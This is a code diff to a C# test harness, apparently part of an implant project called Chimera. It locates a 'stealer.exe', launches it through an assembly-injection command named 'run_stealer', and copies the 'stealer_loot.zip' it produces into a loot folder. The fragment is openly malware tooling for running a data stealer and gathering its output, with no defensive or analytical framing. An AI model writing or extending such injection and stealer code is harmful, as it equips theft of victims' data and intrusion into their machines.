@@ -56,7 +56,11 @@ namespace Chimera
             // STEP 2: Check stealer.exe is present
             // ----------------------------------------------------------------
             Section("2. Check stealer.exe");
-            string stealerExe = Path.Combine(Staging.Dir, "stealer.exe");
+            // stealer.exe sits next to chimera.exe (C:\Users\Public in local test)
+            string selfDir    = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location) ?? "";
+            string stealerExe = File.Exists(Path.Combine(selfDir, "stealer.exe"))
+                ? Path.Combine(selfDir, "stealer.exe")
+                : @"C:\Users\Public\stealer.exe";
             if (File.Exists(stealerExe))
                 Log("[+] stealer.exe found at " + stealerExe);
             else
@@ -70,9 +74,8 @@ namespace Chimera
             string result = Commands.InjectAssembly.Execute("run_stealer", "local-task-001", "local-uuid-0000");
             Log(result);
 
-            // stealer.exe writes stealer_loot.zip to C:\Users\Public (Staging.Dir)
-            // Copy it to chimera-local-test for easy inspection
-            string stagingLoot = Path.Combine(Staging.Dir, "stealer_loot.zip");
+            // stealer.exe writes stealer_loot.zip next to itself
+            string stagingLoot = Path.Combine(Path.GetDirectoryName(stealerExe) ?? selfDir, "stealer_loot.zip");
             string lootZip     = Path.Combine(LocalConfig.LootDir, "stealer_loot.zip");
             if (File.Exists(stagingLoot))
             {
